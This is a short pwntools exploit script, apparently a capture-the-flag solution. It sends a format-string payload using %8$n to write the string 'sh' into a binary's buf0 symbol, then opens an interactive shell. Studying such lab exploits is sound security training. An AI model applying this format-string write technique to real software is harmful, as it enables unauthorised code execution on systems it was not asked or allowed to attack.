#First import pwn tools
from pwn import *

#Declare the binary, and run it
elf = ELF("./f5_64")
context(binary=elf)
target = process("./f5_64")

#Grab the buf0 address
buf0_address = p64(elf.symbols["buf0"])

#Unpack sh and store as a string
sh = str(u64("sh\0\0\0\0\0\0")) 

#Finish crafting the exploit and send it
target.sendline("%" + sh + "x%8$n00000" + str(buf0_address))

#Drop to an interactive prompt to use the shell
target.interactive()
